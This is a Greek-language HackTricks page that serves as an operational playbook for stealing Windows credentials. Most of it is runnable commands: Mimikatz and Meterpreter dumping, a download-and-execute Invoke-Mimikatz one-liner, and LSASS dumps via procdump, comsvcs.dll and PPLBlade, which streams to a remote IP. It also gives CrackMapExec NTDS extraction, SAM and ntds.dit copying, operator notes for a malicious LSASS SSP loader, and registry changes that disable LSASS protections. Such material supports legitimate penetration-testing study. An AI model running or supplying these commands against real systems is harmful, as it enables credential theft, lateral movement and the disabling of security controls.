# Κλοπή Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Βρείτε άλλα πράγματα που μπορεί να κάνει το Mimikatz σε** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Μάθετε για κάποιες πιθανές credentials προστασίες εδώ.**](credentials-protections.md) **Αυτές οι προστασίες θα μπορούσαν να αποτρέψουν το Mimikatz από το να εξάγει κάποια credentials.**

## Credentials με Meterpreter

Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **που** έχω δημιουργήσει για να **αναζητήσετε passwords και hashes** μέσα στο θύμα.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Καθώς **Procdump από** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**είναι ένα νόμιμο εργαλείο της Microsoft**, δεν εντοπίζεται από το Defender.\
Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **dump the lsass process**, **download the dump** και να **extract** τα **credentials locally** από το dump.

Μπορείτε επίσης να χρησιμοποιήσετε το [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Αυτή η διαδικασία εκτελείται αυτόματα με [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Σημείωση**: Κάποια **AV** μπορεί να **ανιχνεύσουν** ως **κακόβουλη** τη χρήση του **procdump.exe to dump lsass.exe**, αυτό συμβαίνει επειδή **ανιχνεύουν** τη συμβολοσειρά **"procdump.exe" και "lsass.exe"**. Έτσι είναι πιο **διακριτικό** να **περνάτε** ως **όρισμα** το **PID** του lsass.exe στο procdump **αντί για** το **όνομα lsass.exe.**

### Dumping lsass with **comsvcs.dll**

A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
It is irrelevant to use the first two arguments, but the third one is divided into three components. The process ID to be dumped constitutes the first component, the dump file location represents the second, and the third component is strictly the word **full**. No alternative options exist.\
Upon parsing these three components, the DLL is engaged in creating the dump file and transferring the specified process's memory into this file.\
Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, thereby eliminating the need to upload and execute procdump. This method is described in detail at [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία με** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Κάντε δεξί κλικ στο Task Bar και κάντε κλικ στο Task Manager
2. Κάντε κλικ στο More details
3. Αναζητήστε τη διεργασία "Local Security Authority Process" στην καρτέλα Processes
4. Κάντε δεξί κλικ στη διεργασία "Local Security Authority Process" και κάντε κλικ στο "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα υπογεγραμμένο από τη Microsoft εκτελέσιμο που αποτελεί μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass με PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα Protected Process Dumper Tool που υποστηρίζει obfuscating των memory dump και τη μεταφορά τους σε απομακρυσμένους σταθμούς εργασίας χωρίς να τα αποθηκεύει στο δίσκο.

**Βασικές λειτουργίες**:

1. Παράκαμψη της PPL protection
2. Απόκρυψη των memory dump αρχείων για να παρακαμφθούν οι μηχανισμοί ανίχνευσης βάσει υπογραφών του Defender
3. Μεταφόρτωση των memory dump με τις RAW και SMB μεθόδους μεταφόρτωσης χωρίς να τα αποθηκεύει στον δίσκο (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Η Ink Dragon διανέμει έναν τρισταδιακό dumper με την ονομασία **LalsDumper** που δεν καλεί ποτέ το `MiniDumpWriteDump`, οπότε τα EDR hooks σε αυτό το API δεν ενεργοποιούνται:

1. **Stage 1 loader (`lals.exe`)** – ψάχνει στο `fdp.dll` για ένα placeholder που αποτελείται από 32 πεζά γράμματα `d`, το αντικαθιστά με το απόλυτο μονοπάτι προς το `rtu.txt`, αποθηκεύει το patched DLL ως `nfdp.dll`, και καλεί `AddSecurityPackageA("nfdp","fdp")`. Αυτό αναγκάζει το **LSASS** να φορτώσει το κακόβουλο DLL ως νέο Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – όταν το LSASS φορτώνει το `nfdp.dll`, το DLL διαβάζει το `rtu.txt`, πραγματοποιεί XOR κάθε byte με `0x20`, και χαρτογραφεί το αποκωδικοποιημένο blob στη μνήμη πριν μεταφέρει την εκτέλεση.
3. **Stage 3 dumper** – το χαρτογραφημένο payload επανυλοποιεί τη λογική του MiniDump χρησιμοποιώντας **direct syscalls** που επιλύονται από hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ένα dedicated export με το όνομα `Tom` ανοίγει το `%TEMP%\<pid>.ddt`, γράφει ένα συμπιεσμένο LSASS dump στο αρχείο και κλείνει το handle ώστε να μπορεί να γίνει εξαγωγή αργότερα.

Σημειώσεις χειριστή:

* Κρατήστε τα `lals.exe`, `fdp.dll`, `nfdp.dll` και `rtu.txt` στον ίδιο φάκελο. Το Stage 1 επαναγράφει το hard-coded placeholder με το απόλυτο μονοπάτι προς το `rtu.txt`, οπότε ο διαχωρισμός τους διασπά την αλυσίδα.
* Η εγγραφή γίνεται προσθέτοντας `nfdp` στο `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Μπορείτε να ορίσετε αυτή την τιμή χειροκίνητα ώστε το LSASS να ξαναφορτώνει το SSP σε κάθε εκκίνηση.
* Τα αρχεία `%TEMP%\*.ddt` είναι συμπιεσμένα dumps. Αποσυμπιέστε τα τοπικά και στη συνέχεια δώστε τα σε Mimikatz/Volatility για εξαγωγή διαπιστευτηρίων.
* Η εκτέλεση του `lals.exe` απαιτεί admin/SeTcb δικαιώματα ώστε το `AddSecurityPackageA` να πετύχει· μόλις η κλήση επιστρέψει, το LSASS φορτώνει διαφανώς το rogue SSP και εκτελεί το Stage 2.
* Η αφαίρεση του DLL από το δίσκο δεν το εκδιώκει από το LSASS. Είτε διαγράψτε την καταχώρηση μητρώου και επανεκκινήστε το LSASS (reboot), είτε αφήστε το για μακροπρόθεσμη επιμονή.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Εξαγωγή του NTDS.dit από τον στοχευμένο DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Εξαγωγή του ιστορικού κωδικών του NTDS.dit από τον στοχευόμενο DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Εμφάνιση του χαρακτηριστικού pwdLastSet για κάθε λογαριασμό στο NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Κλοπή SAM & SYSTEM

Αυτά τα αρχεία θα πρέπει να είναι **τοποθετημένα** στο _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM_. Αλλά **δεν μπορείτε απλώς να τα αντιγράψετε με τον συνηθισμένο τρόπο** γιατί είναι προστατευμένα.

### Από το μητρώο

Ο ευκολότερος τρόπος για να κλέψετε αυτά τα αρχεία είναι να πάρετε ένα αντίγραφο από το μητρώο:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Κατεβάστε** αυτά τα αρχεία στον Kali υπολογιστή σας και **εξαγάγετε τα hashes** χρησιμοποιώντας:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Μπορείτε να αντιγράψετε προστατευμένα αρχεία χρησιμοποιώντας αυτήν την υπηρεσία. Πρέπει να είστε Administrator.

#### Χρήση vssadmin

Το vssadmin binary είναι διαθέσιμο μόνο σε εκδόσεις Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Αλλά μπορείτε να κάνετε το ίδιο από το **Powershell**. Αυτό είναι ένα παράδειγμα του **πώς να αντιγράψετε το SAM file** (ο σκληρός δίσκος που χρησιμοποιείται είναι "C:" και αποθηκεύεται στο C:\users\Public) αλλά μπορείτε να χρησιμοποιήσετε αυτό για την αντιγραφή οποιουδήποτε προστατευμένου αρχείου:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Κώδικας από το βιβλίο: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να κάνετε ένα αντίγραφο των SAM, SYSTEM και ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Διαπιστευτήρια - NTDS.dit**

Το **NTDS.dit** αρχείο θεωρείται η καρδιά του **Active Directory**, περιέχοντας κρίσιμα δεδομένα για αντικείμενα χρηστών, ομάδες και τις συμμετοχές τους. Εδώ αποθηκεύονται τα **password hashes** των domain χρηστών. Αυτό το αρχείο είναι μια βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στη διαδρομή **_%SystemRoom%/NTDS/ntds.dit_**.

Μέσα σε αυτή τη βάση δεδομένων, διατηρούνται τρεις κύριοι πίνακες:

- **Data Table**: Ο πίνακας αυτός είναι υπεύθυνος για την αποθήκευση λεπτομερειών σχετικά με αντικείμενα όπως χρήστες και ομάδες.
- **Link Table**: Καταγράφει σχέσεις, όπως συμμετοχές σε ομάδες.
- **SD Table**: Εδώ φυλάσσονται οι **Security descriptors** για κάθε αντικείμενο, εξασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης για τα αποθηκευμένα αντικείμενα.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Τα Windows χρησιμοποιούν _Ntdsa.dll_ για να αλληλεπιδράσουν με αυτό το αρχείο και χρησιμοποιείται από το _lsass.exe_. Έτσι, μέρος του αρχείου **NTDS.dit** μπορεί να βρίσκεται **μέσα στη μνήμη του `lsass`** (μπορείτε να βρείτε τα πιο πρόσφατα προσπελασμένα δεδομένα, πιθανώς λόγω βελτίωσης επιδόσεων με χρήση **cache**).

#### Αποκρυπτογράφηση των hashes μέσα στο NTDS.dit

O hash κρυπτογραφείται 3 φορές:

1. Αποκρυπτογράφηση του Password Encryption Key (**PEK**) χρησιμοποιώντας το **BOOTKEY** και **RC4**.
2. Αποκρυπτογράφηση του **hash** χρησιμοποιώντας το **PEK** και **RC4**.
3. Αποκρυπτογράφηση του **hash** χρησιμοποιώντας **DES**.

Το **PEK** έχει την **ίδια τιμή** σε **κάθε domain controller**, αλλά είναι **κρυπτογραφημένο** μέσα στο αρχείο **NTDS.dit** χρησιμοποιώντας το **BOOTKEY** του αρχείου **SYSTEM** του domain controller (διαφέρει μεταξύ των domain controllers). Γι' αυτό, για να αποκτήσετε τα credentials από το αρχείο NTDS.dit **χρειάζεστε τα αρχεία NTDS.dit και SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Μπορείτε επίσης να χρησιμοποιήσετε το κόλπο [**volume shadow copy**](#stealing-sam-and-system) για να αντιγράψετε το αρχείο **ntds.dit**. Θυμηθείτε ότι θα χρειαστείτε επίσης ένα αντίγραφο του αρχείου **SYSTEM** (πάλι, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) κόλπο).

### **Εξαγωγή hashes από NTDS.dit**

Μόλις έχετε **αποκτήσει** τα αρχεία **NTDS.dit** και **SYSTEM** μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **εξάγετε τα hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Μπορείτε επίσης να **εξάγετε αυτόματα** χρησιμοποιώντας έναν έγκυρο domain admin user:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Για **μεγάλα αρχεία NTDS.dit** συνιστάται να τα εξάγετε χρησιμοποιώντας [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ή το **mimikatz** `lsadump::lsa /inject`

### **Εξαγωγή αντικειμένων domain από το NTDS.dit σε μια βάση δεδομένων SQLite**

Τα αντικείμενα NTDS μπορούν να εξαχθούν σε μια βάση δεδομένων SQLite με το [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Δεν εξάγονται μόνο τα μυστικά αλλά και ολόκληρα τα αντικείμενα και οι ιδιότητές τους για περαιτέρω εξαγωγή πληροφοριών όταν το raw αρχείο NTDS.dit έχει ήδη ανακτηθεί.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Το `SYSTEM` hive είναι προαιρετικό αλλά επιτρέπει την αποκρυπτογράφηση μυστικών (NT & LM hashes, supplemental credentials όπως cleartext passwords, kerberos ή trust keys, NT & LM password histories). Μαζί με άλλες πληροφορίες, τα ακόλουθα δεδομένα εξάγονται : user and machine accounts με τα hashes τους, UAC flags, timestamp για last logon και password change, accounts description, names, UPN, SPN, groups και recursive memberships, organizational units tree και membership, trusted domains με trusts type, direction και attributes...

## Lazagne

Κατεβάστε το binary από [here](https://github.com/AlessandroZ/LaZagne/releases). Μπορείτε να χρησιμοποιήσετε αυτό το binary για να εξάγετε credentials από διάφορα software.
```
lazagne.exe all
```
## Άλλα εργαλεία για εξαγωγή διαπιστευτηρίων από SAM και LSASS

### Windows credentials Editor (WCE)

Αυτό το εργαλείο μπορεί να χρησιμοποιηθεί για να εξάγει διαπιστευτήρια από τη μνήμη. Κατεβάστε το από: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Εξάγει διαπιστευτήρια από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Εξαγωγή διαπιστευτηρίων από το SAM file
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Κατέβασέ το από: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) και απλώς **execute it** και οι κωδικοί θα εξαχθούν.

## Εξόρυξη ανενεργών συνεδριών RDP και αποδυνάμωση ελέγχων ασφαλείας

Ink Dragon’s FinalDraft RAT περιλαμβάνει έναν tasker `DumpRDPHistory` του οποίου οι τεχνικές είναι χρήσιμες για κάθε red-teamer:

### Συλλογή τηλεμετρίας τύπου DumpRDPHistory

* **Εξερχόμενοι στόχοι RDP** – αναλύστε κάθε user hive στο `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Κάθε υποκλειδί αποθηκεύει το όνομα διακομιστή, `UsernameHint`, και τη χρονοσφραγίδα τελευταίας εγγραφής. Μπορείτε να αναπαράγετε τη λογική του FinalDraft με PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Εισερχόμενα αποδεικτικά RDP** – ερωτήστε το log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` για Event IDs **21** (επιτυχής σύνδεση) και **25** (αποσύνδεση) για να χαρτογραφήσετε ποιος διαχειρίστηκε το σύστημα:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Μόλις μάθετε ποιος Domain Admin συνδέεται τακτικά, κάντε dump το LSASS (με LalsDumper/Mimikatz) ενώ η **disconnected** συνεδρία του/της εξακολουθεί να υπάρχει. Το CredSSP + NTLM fallback αφήνει τον verifier και τα tokens τους στο LSASS, τα οποία μπορούν στη συνέχεια να αναπαραχθούν μέσω SMB/WinRM για να αρπάξετε το `NTDS.dit` ή να στήσετε persistence σε domain controllers.

### Υποβαθμίσεις του registry που στοχεύει το FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Η ρύθμιση `DisableRestrictedAdmin=1` αναγκάζει την πλήρη επαναχρησιμοποίηση διαπιστευτηρίων/ticket κατά τη διάρκεια του RDP, επιτρέποντας pivot τύπου pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` απενεργοποιεί το UAC token filtering, έτσι ώστε local admins να λαμβάνουν unrestricted tokens μέσω του δικτύου.
* `DSRMAdminLogonBehavior=2` επιτρέπει στον DSRM administrator να συνδεθεί ενώ ο DC είναι online, δίνοντας στους επιτιθέμενους έναν ακόμη ενσωματωμένο λογαριασμό υψηλών προνομίων.
* `RunAsPPL=0` αφαιρεί τις LSASS PPL προστασίες, κάνοντας την πρόσβαση στη μνήμη εύκολη για dumpers όπως το LalsDumper.

## Αναφορές

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
